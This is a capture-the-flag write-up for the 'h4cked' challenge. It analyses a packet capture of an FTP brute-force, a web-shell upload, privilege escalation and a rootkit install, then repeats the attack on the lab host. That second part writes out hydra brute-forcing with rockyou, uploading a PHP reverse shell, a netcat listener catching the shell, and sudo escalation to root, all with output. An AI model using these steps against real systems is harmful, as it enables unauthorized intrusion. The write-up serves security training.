<h1 align="center">Challenge 058 - h4cked </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/1e1ceab5-338c-4003-a9da-9590ced8f2d4" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: 1/10 (Very Easy) <b>Completed</b>: ✔️ 23.12.2025 </p>

For this scenario it seems our machine got hacked by an enonymous threat actor. However, we are lucky to have a .pcap file from the attack. We need to determine what happened. 

## Oh no! We've been hacked!

Downloading the .pcap file we use Wireshark to get an idea about what went down and how our device got compromised.

Immediately when analyzing the file on Wireshark we recognize a bunch of TCP connections that were being made. Following the TCP stream in Wireshark allows us to view all the data exchanged between two endpoints in a TCP connection. It helps analyzing the contents of packets in the order they were sent and received, making it easier to identify issues, reconstruct conversations, and gather insights about the communication. 

<img width="917" height="366" alt="image" src="https://github.com/user-attachments/assets/d91d5dcd-3afa-40fc-8313-2311e03ca43f" />

The first question is specifically asking about the service the attacker was trying to log in to. Following the TCP stream makes it clear that it's the FTP service. It's a standard network protocol used to transfer files between a client and a server over a TCP/IP network.

The second question is mentioning a very popular tool by Van Hauser, which can be used to brute force a series of services. The name of that tool would be hydra. We can also identify patterns in Wireshark, where a lot of login attempts from a single IP address were executed within a short time period.

<img width="1102" height="592" alt="image" src="https://github.com/user-attachments/assets/df95f794-9a6d-4e72-b5e9-192483e62b2c" />

With the screenshot we can already determine the username with which the attacker was trying to login as well. Now if we want to find out the user' password we just keep on scrolling through the packets until we find a response packet, that talks about a successful login. The request packet before that contains the right password.

<img width="1060" height="75" alt="image" src="https://github.com/user-attachments/assets/db49e83c-7ece-4f68-a8a2-fa10e9c643f7" />

We keep on scrolling to find out the current FTP working directory after the attacker logged in. 

<img width="1168" height="92" alt="image" src="https://github.com/user-attachments/assets/1ded435b-e0eb-4483-b60e-baea6a8991ea" />

After that we are asked about the backdoor that the attacker uploaded. What is the backdoor's filename? Once again we just keep on following the procedure of scrolling through the packets sent through the FTP service and quickly find an executable that is being uploaded through the STOR command. 

<img width="1240" height="181" alt="image" src="https://github.com/user-attachments/assets/993b7b79-4b55-4802-b7b2-47e389af7f09" />

Now we are tasked to find out the URL, from which this specific backdoor can be downloaded. The location itself is clarified inside the uploaded file. To get a hold of those information, we can filter for FTP data transfer packets. This filter allows us to view the packets that are involved in the actual file transfer occuring during an FTP session, making it easier to analyze the data being transferred.

<img width="1117" height="931" alt="image" src="https://github.com/user-attachments/assets/f4e003da-ef3c-4e74-a8b0-4f371d1460dc" />

The line-based text data reveals all the information we need.

Now we are getting to the part where the attacker successfully got his reverse shell running and proceeds to manually execute commands. To find that part of the interaction in Wireshark we just have to look for packets that are running a HTTP GET request at '/shell.php', as this suggests the attacker is exploiting the vulnerability. After the GET request is being acknowledged and synchronization is taking place we can try following the TCP stream once again.

<img width="962" height="901" alt="image" src="https://github.com/user-attachments/assets/2c5326ec-70c0-4711-b4d2-d1bc6b217cb5" />

With that we get a good idea on the actions the attacker took after compromising the machine. When further scrolling through the TCP stream, we see a very particular segment, that turns the regular shell session into a new shell with elevated permissions (switching to the 'jenny' user).

<img width="849" height="469" alt="image" src="https://github.com/user-attachments/assets/a50a241c-dad7-4098-86f8-aebb0f6da94f" />

The prompt '$' changes to 'jenny@wir3:/$'. This indicates that we are now operating under the 'jenny' user's context, and 'wir3' is the hostname of the machine. The change signifies that we have successfully escalated privileges and are now in a different user environment. The same screenshot also showcases the command with which the attacker spawned a new TTY shell. With it, the attacker was able to gain information to finally get a root shell.

<img width="846" height="419" alt="image" src="https://github.com/user-attachments/assets/7c4093bb-2b9f-4f2d-a094-21f4cf001c49" />

The attacker did what a lot of people would, when trying to escalate privileges: check which kind of commands the user would be able to run as sudo. In this instance 'jenny' seems to have had the ability to run EVERY command with sudo. Very bad and a high security concern. Here the attacker used it to his advantage to just switch the user to root.

After gaining root privileges the attacker downloaded something from GitHub. What is the name of the GitHub project? Just follow through with the TCP stream to be enlightened and get the answer for said question.

<img width="477" height="231" alt="image" src="https://github.com/user-attachments/assets/170da34e-a641-4a1c-9569-dbb6b838be23" />

The last thing to determine was what kind of stealthy backdoor was being installed on the system. With the name of the GitHub project known I thought just setttling on checking out the repository itself would be enough, but unfortunately it had been disabled.

<div align="center">
  <img width="464" height="204" alt="image" src="https://github.com/user-attachments/assets/2cbbc2b6-3c3a-4c2e-bd66-d86cf5b3f3bf" />
</div>

By using common sense I still was able to determine that this probably would have to be a rootkit. If we consider the fact that the question itself is mentioning a stealthy backdoor, that is very hard to detect it very much aligns with the idea of a rootkit, that is designed to gain unauthorized access to a computer or network, *while hiding it's presence*. It allows an attacker to maintain control over a system without being detected. Problem solved! Well not quite. Hacking back to the machine is the next goal though...

## Hack your way back into the machine

Since the attacker changed the user's password we have to run a tool like hydra on the FTP service in the hopes that he did not choose a complex password. We might get lucky with a common word list.

```
root@ip-10-67-102-92:~# hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.67.130.193
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-23 20:19:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.67.130.193:21/
[21][ftp] host: 10.67.130.193   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-23 20:19:36
```

And with that we can try to to change the necessary values in the web shell and upload it to the webserver. For that we just try to change the $ip variable to our own IP address and chmod the file if necessary.

```
root@ip-10-67-102-92:~# ftp 10.67.130.193 
Connected to 10.67.130.193.
220 Hello FTP World!
Name (10.67.130.193:root): jenny
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.
```

We can see the php file. Let's try to download and modify it's content to later upload it in said directory again.

```
ftp> get shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for shell.php (5493 bytes).
226 Transfer complete.
5493 bytes received in 0.00 secs (13.1621 MB/s)
ftp> quit
221 Goodbye.
```

After modifying the files IP-Address and port (1337) we can try to upload it in the ftp service again. So after logging in once again, we use the put command

```
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (163.6744 MB/s)
```

All that's left to do to run the web shell was accessing it through a web browser by navigating to *http://<ip-address>/shell.php*. The web shell would allow command execution and would use it to send commands to my listener that I set up beforehand.

```
root@ip-10-67-102-92:~# nc -lvnp 1337
Listening on 0.0.0.0 1337
Connection received on 10.67.130.193 48596
Linux ip-10-67-130-193 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 20:49:53 up 46 min,  0 users,  load average: 0.01, 0.10, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

After reaching this point I was able to gain root privileges by just copying the steps the attacker took himself. It was pretty easy.

```
$ python3 -c 'import pty; pty.spawn("bin/bash")'
www-data@ip-10-67-130-193:/$ su jenny
su jenny
Password: 987654321

jenny@ip-10-67-130-193:/$ sudo -l
sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on ip-10-67-130-193:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on ip-10-67-130-193:
    (ALL : ALL) ALL
jenny@ip-10-67-130-193:/$ sudo su
sudo su
root@ip-10-67-130-193:/# whoami
whoami
root
```

Now from this point on directory traversal revealed the rest and with it the Reptile directory that hid the flag.txt.

<img width="442" height="312" alt="Bildschirmfoto vom 2025-12-23 22-04-49" src="https://github.com/user-attachments/assets/c26c53c6-f4bc-4095-920b-a41279a1fca1" />

## Lesson Learned
This box was a great way to get a general understanding of how Wireshark packets can be read, how brute-force attempts can be interpreted and how to filter efficiently to get to the results we were interested in. The basic techniques for exploiting and securing systems was also given, giving insight on FTP brute-forcing, web shell uploads, and privilege escalation to gain root access. It emphasized the importance of understanding vulnerabilities, the risks associated with improper configurations, and the necissity of securing systems against such attacks. I can't recommend this box enough and hope I will get another opportunity to make use of analyzing packets.
